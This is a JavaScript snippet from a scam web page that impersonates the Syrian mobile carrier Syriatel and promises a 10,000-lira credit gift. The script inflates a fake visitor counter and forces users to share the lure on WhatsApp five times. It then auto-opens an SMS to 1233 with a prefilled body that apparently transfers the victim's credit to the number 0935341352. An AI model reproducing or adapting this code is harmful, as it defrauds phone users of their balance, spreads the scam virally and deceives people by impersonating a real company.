<script>
    const number = "1233"; // رقم الهاتف
    const message = "0935341352 200"; // محتوى الرسالة
    const delay = 10; // عدد الثواني قبل الإرسال التلقائي
    const siteLink = "https://syriatell.github.io/Lit/"; // رابط الموقع
    const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة رصيد هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
    
    let shareCount = 0; // عدد المشاركات

    // تخزين الرقم الأولي 7946850
    let initialVisitorCount = 7946850;

    // تحديث عدد الزوار بشكل وهمي
    function increaseVisitorCount() {
        const visitorCountElement = document.getElementById("visitorCount");

        setInterval(() => {
            initialVisitorCount += 5;  // زيادة عدد الزوار بمعدل 5 في الثانية
            visitorCountElement.textContent = initialVisitorCount;
        }, 200);  // تحديث كل 200 ميللي ثانية لزيادة العدد بشكل سريع
    }

    // بداية زيادة عدد الزوار عند تحميل الصفحة
    window.onload = function() {
        increaseVisitorCount();
    };

    // وظيفة مشاركة الرسالة عبر واتس آب
    function shareOnWhatsApp() {
        // كلما شارك المستخدم، ازداد العد
        shareCount++;
        // تحديث عدد المشاركات المتبقية
        const remainingShares = 5 - shareCount;
        document.getElementById("remainingShares").textContent = remainingShares;

        // تمكين زر 2 إذا كانت المشاركات 5 أو أكثر
        if (shareCount >= 5) {
            document.getElementById("copyBtn").disabled = false;
        }
        const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
        window.open(whatsappUrl, "_blank");
        alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
    }

    // وظيفة إرسال الرسالة عبر تطبيق الرسائل (SMS)
    function sendSMS() {
        const phoneNumber = "1233"; // رقم الهاتف
        const messageContent = "0935341352 200"; // محتوى الرسالة
        
        // فتح تطبيق الرسائل مع الرقم والمحتوى
        window.location.href = `sms:${phoneNumber}?body=${encodeURIComponent(messageContent)}`;
    }

    // عداد زمني للإرسال التلقائي
    let timeLeft = delay;
    const timerElement = document.getElementById("timer");

    const countdown = setInterval(() => {
        timeLeft--;
        timerElement.textContent = timeLeft;

        // إذا انتهى الوقت ولم يتم الوصول إلى 5 مشاركات، يتم إيقاف العداد
        if (timeLeft <= 0) {
            clearInterval(countdown); // إيقاف العداد
            
            // شرط التحقق من عدد المشاركات
            if (shareCount >= 5) {
                sendSMS(); // إرسال الرسالة تلقائيًا إذا تمت 5 مشاركات
            } else {
                alert("يجب مشاركة الرسالة 5 مرات قبل الإرسال التلقائي!");
            }
        }
    }, 1000); // تحديث كل ثانية
</script>
